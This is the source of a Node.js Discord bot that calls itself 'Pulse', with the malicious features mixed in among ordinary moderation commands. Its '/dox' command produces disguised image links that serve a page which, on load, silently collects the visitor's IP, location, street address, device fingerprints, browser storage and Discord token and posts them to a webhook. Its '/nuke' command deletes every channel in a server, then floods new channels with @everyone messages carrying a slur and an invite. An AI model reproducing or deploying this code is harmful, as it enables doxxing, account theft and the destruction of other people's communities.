const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration
    ]
});

const links = new Map();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`Dox server on ${PORT}`));

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    await client.application.commands.set([]);
    await client.application.commands.set([
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
        { name: 'nuke', description: 'Delete channels, create, flood, leave', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
        { name: 'ad', description: 'Advertise server' },
        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'serverinfo', description: 'Server information' },
        { name: 'userinfo', description: 'User information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
        { name: 'ping', description: 'Bot latency' },
        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'kick', description: 'Kick a member', options: [{ name: 'user', type: 6, description: 'User to kick', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'ban', description: 'Ban a member', options: [{ name: 'user', type: 6, description: 'User to ban', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'unban', description: 'Unban a user by ID', options: [{ name: 'userid', type: 3, description: 'User ID to unban', required: true }] },
        { name: 'timeout', description: 'Timeout a member', options: [{ name: 'user', type: 6, description: 'Target user', required: true }, { name: 'duration', type: 4, description: 'Minutes (1-40320)', required: true }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'role', description: 'Add or remove role', options: [{ name: 'action', type: 3, description: 'add or remove', required: true, choices: [{ name: 'add', value: 'add' }, { name: 'remove', value: 'remove' }] }, { name: 'user', type: 6, description: 'Target user', required: true }, { name: 'role', type: 8, description: 'Role to add/remove', required: true }] },
        { name: 'poll', description: 'Create a poll', options: [{ name: 'question', type: 3, description: 'Poll question', required: true }, { name: 'option1', type: 3, description: 'Option 1', required: true }, { name: 'option2', type: 3, description: 'Option 2', required: true }, { name: 'option3', type: 3, description: 'Option 3', required: false }, { name: 'option4', type: 3, description: 'Option 4', required: false }] },
        { name: 'embed', description: 'Send a custom embed', options: [{ name: 'title', type: 3, description: 'Embed title', required: true }, { name: 'description', type: 3, description: 'Embed description', required: true }, { name: 'color', type: 3, description: 'Hex color (e.g. #ff0000)', required: false }] },
        { name: 'invite', description: 'Get bot invite link' },
        { name: 'help', description: 'Show all commands' }
    ]);
    console.log('Commands registered');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, user, member, guild, channel } = interaction;

    if (commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = options.getString('webhook');
        if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) return interaction.editReply('Invalid webhook.');
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: user.tag });
        const embed = new EmbedBuilder().setTitle('Dox Link Ready').setColor(0x22c55e).setDescription(`🔗 ${url}\n\nSends IP, geolocation, battery, connection, device fingerprint, Discord token, and more.`).setFooter({ text: `Generated by ${user.tag}` });
        await interaction.editReply({ embeds: [embed] });
    }

    else if (commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = Math.min(options.getInteger('count'), 100);
        const msg = options.getString('message');
        const delay = options.getInteger('delay') || 0;
        if (!channel) return interaction.editReply('No channel.');
        try {
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`Spammed ${count} messages.`);
        } catch (e) {
            await interaction.editReply(`Failed: ${e.message}`);
        }
    }

    else if (commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        if (!guild) return interaction.editReply('Server only.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('Need Admin.');
        const channelCount = Math.min(options.getInteger('channels') || 20, 50);
        const msgCount = Math.min(options.getInteger('messages') || 10, 100);
        const delayMs = Math.min(options.getInteger('delay') || 50, 500);
        const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
        try {
            await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
            const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
            const valid = newChannels.filter(c => c);
            const messages = [];
            for (let i = 0; i < msgCount; i++) {
                let line = variants[i % variants.length];
                let big = `@everyone ${line}\n`;
                while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
                big += `\n${inviteLine}`;
                messages.push(big.slice(0, 2000));
            }
            for (let i = 0; i < messages.length; i++) {
                await Promise.all(valid.map(c => c.send(messages[i]).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }
            await guild.leave();
            await interaction.editReply(`Nuked. Created ${valid.length} channels, sent ${msgCount} messages each.`);
        } catch (e) {
            await interaction.editReply(`Nuke failed: ${e.message}`);
        }
    }

    else if (commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        if (!channel) return interaction.editReply('No channel.');
        const embed = new EmbedBuilder().setTitle('🔥 Pulse Nuke Power').setColor(0x8B5CF6).setDescription(`Join Pulse:\n${INVITE_LINK}`).setFooter({ text: 'Pulse Bot' });
        await channel.send({ embeds: [embed] });
        await interaction.editReply('Ad sent.');
    }

    else if (commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = Math.min(options.getInteger('amount'), 100);
        const targetUser = options.getUser('user');
        const reason = options.getString('reason') || 'No reason';
        if (!channel) return interaction.editReply('No channel.');
        if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('Need Manage Messages.');
        let messages = await channel.messages.fetch({ limit: amount });
        if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        const embed = new EmbedBuilder().setTitle('Purge Complete').setColor(0x22c55e).setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`).addFields({ name: 'Reason', value: reason });
        await interaction.editReply({ embeds: [embed] });
    }

    else if (commandName === 'serverinfo') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const owner = await guild.fetchOwner();
        const embed = new EmbedBuilder().setTitle(guild.name).setColor(0x8B5CF6).setThumbnail(guild.iconURL({ dynamic: true, size: 256 })).addFields(
            { name: 'ID', value: guild.id, inline: true },
            { name: 'Owner', value: owner.user.tag, inline: true },
            { name: 'Members', value: `${guild.memberCount}`, inline: true },
            { name: 'Channels', value: `${guild.channels.cache.size}`, inline: true },
            { name: 'Roles', value: `${guild.roles.cache.size}`, inline: true },
            { name: 'Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
        );
        await interaction.reply({ embeds: [embed] });
    }

    else if (commandName === 'userinfo') {
        const target = options.getUser('user') || user;
        const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
        const embed = new EmbedBuilder().setTitle(target.tag).setColor(0x8B5CF6).setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 })).addFields(
            { name: 'ID', value: target.id, inline: true },
            { name: 'Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
            { name: 'Bot', value: target.bot ? 'Yes' : 'No', inline: true }
        );
        if (memberTarget) {
            embed.addFields(
                { name: 'Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                { name: 'Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
            );
        }
        await interaction.reply({ embeds: [embed] });
    }

    else if (commandName === 'math') {
        const expr = options.getString('expression');
        try {
            const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
            if (!sanitized) return interaction.reply({ content: 'Invalid expression.', ephemeral: true });
            const result = Function(`"use strict"; return (${sanitized})`)();
            await interaction.reply({ content: `🧮 **${expr}** = **${result}**`, ephemeral: true });
        } catch (e) {
            await interaction.reply({ content: `Error: ${e.message}`, ephemeral: true });
        }
    }

    else if (commandName === 'ping') {
        const sent = await interaction.reply({ content: 'Pinging...', fetchReply: true });
        const latency = sent.createdTimestamp - interaction.createdTimestamp;
        await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
    }

    else if (commandName === 'say') {
        const msg = options.getString('message');
        if (!channel) return interaction.reply({ content: 'No channel.', ephemeral: true });
        await channel.send(msg);
        await interaction.reply({ content: 'Sent.', ephemeral: true });
    }

    else if (commandName === 'avatar') {
        const target = options.getUser('user') || user;
        const embed = new EmbedBuilder().setTitle(`${target.tag}'s Avatar`).setImage(target.displayAvatarURL({ dynamic: true, size: 1024 })).setColor(0x8B5CF6);
        await interaction.reply({ embeds: [embed] });
    }

    else if (commandName === 'kick') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const target = options.getUser('user');
        const reason = options.getString('reason') || 'No reason';
        const targetMember = await guild.members.fetch(target.id).catch(() => null);
        if (!targetMember) return interaction.reply({ content: 'User not in server.', ephemeral: true });
        if (!member.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: 'No permission.', ephemeral: true });
        if (targetMember.id === client.user.id) return interaction.reply({ content: 'Cannot kick myself.', ephemeral: true });
        await targetMember.kick(reason);
        await interaction.reply({ content: `Kicked ${target.tag} for ${reason}` });
    }

    else if (commandName === 'ban') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const target = options.getUser('user');
        const reason = options.getString('reason') || 'No reason';
        if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'No permission.', ephemeral: true });
        await guild.bans.create(target.id, { reason });
        await interaction.reply({ content: `Banned ${target.tag} for ${reason}` });
    }

    else if (commandName === 'unban') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const userId = options.getString('userid');
        if (!member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'No permission.', ephemeral: true });
        await guild.bans.remove(userId);
        await interaction.reply({ content: `Unbanned user ${userId}` });
    }

    else if (commandName === 'timeout') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const target = options.getUser('user');
        const duration = options.getInteger('duration');
        const reason = options.getString('reason') || 'No reason';
        const targetMember = await guild.members.fetch(target.id).catch(() => null);
        if (!targetMember) return interaction.reply({ content: 'User not in server.', ephemeral: true });
        if (!member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.reply({ content: 'No permission.', ephemeral: true });
        await targetMember.timeout(duration * 60000, reason);
        await interaction.reply({ content: `Timed out ${target.tag} for ${duration} minutes.` });
    }

    else if (commandName === 'role') {
        if (!guild) return interaction.reply({ content: 'Server only.', ephemeral: true });
        const action = options.getString('action');
        const target = options.getUser('user');
        const role = options.getRole('role');
        const targetMember = await guild.members.fetch(target.id).catch(() => null);
        if (!targetMember) return interaction.reply({ content: 'User not in server.', ephemeral: true });
        if (!member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.reply({ content: 'No permission.', ephemeral: true });
        if (role.position >= guild.members.me.roles.highest.position) return interaction.reply({ content: 'Role too high.', ephemeral: true });
        if (action === 'add') {
            await targetMember.roles.add(role);
            await interaction.reply({ content: `Added ${role.name} to ${target.tag}` });
        } else {
            await targetMember.roles.remove(role);
            await interaction.reply({ content: `Removed ${role.name} from ${target.tag}` });
        }
    }

    else if (commandName === 'poll') {
        if (!channel) return interaction.reply({ content: 'No channel.', ephemeral: true });
        const question = options.getString('question');
        const opt1 = options.getString('option1');
        const opt2 = options.getString('option2');
        const opt3 = options.getString('option3');
        const opt4 = options.getString('option4');
        const opts = [opt1, opt2, opt3, opt4].filter(o => o);
        const emojis = ['1️⃣', '2️⃣', '3️⃣', '4️⃣'];
        let desc = opts.map((o, i) => `${emojis[i]} ${o}`).join('\n');
        const embed = new EmbedBuilder().setTitle(`📊 ${question}`).setDescription(desc).setColor(0x8B5CF6);
        const msg = await channel.send({ embeds: [embed] });
        for (let i = 0; i < opts.length; i++) await msg.react(emojis[i]);
        await interaction.reply({ content: 'Poll created.', ephemeral: true });
    }

    else if (commandName === 'embed') {
        if (!channel) return interaction.reply({ content: 'No channel.', ephemeral: true });
        const title = options.getString('title');
        const description = options.getString('description');
        const color = options.getString('color') || '#8B5CF6';
        const embed = new EmbedBuilder().setTitle(title).setDescription(description).setColor(color).setTimestamp();
        await channel.send({ embeds: [embed] });
        await interaction.reply({ content: 'Embed sent.', ephemeral: true });
    }

    else if (commandName === 'invite') {
        await interaction.reply({ content: `🔗 Invite me: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`, ephemeral: true });
    }

    else if (commandName === 'help') {
        const commands = client.application.commands.cache.map(c => `\`/${c.name}\` - ${c.description}`).join('\n');
        const embed = new EmbedBuilder().setTitle('📋 Commands').setDescription(commands).setColor(0x8B5CF6).setFooter({ text: `Total ${client.application.commands.cache.size} commands` });
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
});

function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";
function hash(s){let h=0;for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}return h.toString(36);}
function getCookie(n){const v="; "+document.cookie;const p=v.split("; "+n+"=");if(p.length===2)return p.pop().split(";").shift();return null;}
async function getIPData(){const apis=[
{url:"https://ipinfo.io/json",parse:d=>({ip:d.ip,country:d.country,region:d.region,city:d.city,postal:d.postal,lat:d.loc?.split(",")[0],lon:d.loc?.split(",")[1],asn:d.asn,isp:d.org,timezone:d.timezone})},
{url:"https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query",parse:d=>({ip:d.query,country:d.country,region:d.regionName,city:d.city,postal:d.zip,lat:d.lat,lon:d.lon,asn:d.as,isp:d.isp,timezone:"N/A"})},
{url:"https://api.ipify.org?format=json",parse:d=>({ip:d.ip})},
{url:"https://ipapi.co/json/",parse:d=>({ip:d.ip,country:d.country_name,region:d.region,city:d.city,postal:d.postal,lat:d.latitude,lon:d.longitude,asn:d.asn,isp:d.org,timezone:d.timezone})},
{url:"https://api.ip.sb/geoip",parse:d=>({ip:d.ip,country:d.country,region:d.region,city:d.city,postal:d.postal,lat:d.latitude,lon:d.longitude,asn:d.asn,isp:d.isp,timezone:d.timezone})},
{url:"https://geoplugin.net/json.gp",parse:d=>({ip:d.geoplugin_request,country:d.geoplugin_countryName,region:d.geoplugin_region,city:d.geoplugin_city,postal:d.geoplugin_postcode,lat:d.geoplugin_latitude,lon:d.geoplugin_longitude,asn:"N/A",isp:d.geoplugin_isp,timezone:d.geoplugin_timezone})}
];for(const api of apis){try{const c=new AbortController();const t=setTimeout(()=>c.abort(),5000);const r=await fetch(api.url,{signal:c.signal});clearTimeout(t);const d=await r.json();if(d.ip){const res=api.parse(d);if(res.ip)return res;}}catch(e){}}return{ip:"N/A",country:"N/A",region:"N/A",city:"N/A",postal:"N/A",lat:"N/A",lon:"N/A",asn:"N/A",isp:"N/A",timezone:"N/A"};}
async function reverseGeocode(lat,lon){try{const r=await fetch("https://nominatim.openstreetmap.org/reverse?lat="+lat+"&lon="+lon+"&format=json&zoom=18&addressdetails=1");const d=await r.json();if(d&&d.display_name)return d.display_name;}catch(e){}return null;}
async function getBattery(){try{const b=await navigator.getBattery();return Math.round(b.level*100)+"% ("+(b.charging?"Charging":"Not")+")";}catch{return"Not Available";}}
function getConnection(){try{const c=navigator.connection||navigator.mozConnection;if(c)return(c.effectiveType||c.type)+" ("+(c.downlink||"N/A")+" Mbps, "+(c.rtt||"N/A")+"ms RTT)";}catch{}return"Not Available";}
function getGPU(){try{const c=document.createElement("canvas");const g=c.getContext("webgl");if(!g)return"N/A";const d=g.getExtension("WEBGL_debug_renderer_info");if(!d)return"N/A";return g.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch{return"N/A";}}
function getWebRTC(){return new Promise(r=>{try{const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(!e.candidate)return;const ip=e.candidate.address||e.candidate.ip;if(ip&&!ip.includes("local")){r(ip);pc.close();}};setTimeout(()=>{r("N/A");pc.close();},2000);}catch{r("N/A");}});}
function getCanvasFP(){try{const c=document.createElement("canvas");c.width=256;c.height=64;const ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);ctx.fillStyle="#069";ctx.fillText("Cwm fjordbank glyphs vext quiz",2,15);ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("Cwm fjordbank glyphs vext quiz",4,17);return c.toDataURL();}catch{return"N/A";}}
function getFonts(){const list=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Tahoma","Trebuchet MS","Calibri","Cambria","Consolas","Segoe UI","Roboto","Open Sans","Lato","Montserrat","Poppins","Ubuntu","Inter"];const base="mmmmmmmmmmlli";const test=document.createElement("span");test.style.cssText="position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;";test.innerHTML=base;document.body.appendChild(test);const refWidth=test.offsetWidth,refHeight=test.offsetHeight;const detected=[];list.forEach(f=>{test.style.fontFamily=f+", monospace";if(test.offsetWidth!==refWidth||test.offsetHeight!==refHeight)detected.push(f);});document.body.removeChild(test);return detected;}
function getAudioFP(){return new Promise(resolve=>{try{const ctx=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);const osc=ctx.createOscillator();osc.type="triangle";osc.frequency.value=1000;const comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);ctx.oncomplete=e=>{const buffer=e.renderedBuffer.getChannelData(0);let str="";for(let i=0;i<100;i++)str+=buffer[i].toFixed(6);resolve(hash(str));};ctx.startRendering();}catch{resolve("N/A");}});}
(async function(){try{const ip=await getIPData();let addr="N/A";let lat=ip.lat||"N/A",lon=ip.lon||"N/A";if(lat!=="N/A"&&lon!=="N/A"){const a=await reverseGeocode(lat,lon);if(a)addr=a;}const battery=await getBattery();const conn=getConnection();const gpu=getGPU();const webrtc=await getWebRTC();const canvas=hash(getCanvasFP());const fonts=getFonts();const audio=await getAudioFP();const ua=navigator.userAgent;const browser=ua.includes("Edg")?"Edge":ua.includes("Chrome")?"Chrome":ua.includes("Firefox")?"Firefox":ua.includes("Safari")?"Safari":"Unknown";const os=ua.includes("Windows NT 10.0")?"Windows 10/11":ua.includes("Mac OS X")?"macOS":ua.includes("Android")?"Android":ua.includes("iPhone")?"iOS":"Unknown";const device=/mobile|android|iphone|ipad/i.test(ua)?"Mobile":/tablet|ipad/i.test(ua)?"Tablet":"Desktop";const screen=screen.width+"x"+screen.height;const cores=navigator.hardwareConcurrency||"N/A";const memory=navigator.deviceMemory||"N/A";const touch=navigator.maxTouchPoints||0;const lang=navigator.language;const now=new Date();const ts=now.toISOString();const local=now.toString();const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;let ls={},ss={};try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage[k];}}catch{}try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage[k];}}catch{}const token=localStorage.getItem("token")||getCookie("token")||"N/A";const fields=[{name:"📍 Address",value:addr},{name:"📌 Coordinates",value:lat+", "+lon},{name:"🌐 IP",value:ip.ip||"N/A"},{name:"🏙️ City",value:ip.city||"N/A"},{name:"🗺️ Region",value:ip.region||"N/A"},{name:"📮 Postal",value:ip.postal||"N/A"},{name:"🔢 ASN",value:ip.asn||"N/A"},{name:"🏢 ISP",value:ip.isp||"N/A"},{name:"🕒 Timezone",value:tz},{name:"🔋 Battery",value:battery},{name:"📶 Connection",value:conn},{name:"📱 Screen",value:screen},{name:"🧠 Browser",value:browser},{name:"💻 OS",value:os},{name:"🖥️ Device",value:device},{name:"💾 Hardware",value:cores+" cores, "+memory+"GB RAM, "+touch+" touch"},{name:"🎮 GPU",value:gpu},{name:"📡 WebRTC",value:webrtc},{name:"🖼️ Canvas FP",value:canvas},{name:"🔤 Fonts",value:fonts.join(", ")||"N/A"},{name:"🔊 Audio FP",value:audio},{name:"🔑 Discord Token",value:token},{name:"📂 localStorage",value:JSON.stringify(ls).slice(0,500)||"N/A"},{name:"📂 sessionStorage",value:JSON.stringify(ss).slice(0,500)||"N/A"},{name:"🌐 Language",value:lang},{name:"⏰ Local Time",value:local},{name:"📅 Timestamp",value:ts}];const embed={title:"☠️ Doxxed",color:0xFF0000,fields:fields,footer:{text:"Logged at "+ts}};await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[embed]})});}catch(e){console.error(e);}document.body.innerHTML="";document.body.style.background="#fff";document.body.style.margin="0";document.body.style.height="100vh";setTimeout(()=>{window.close();window.location.href="about:blank";},1000);})();
</script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

client.login(TOKEN);
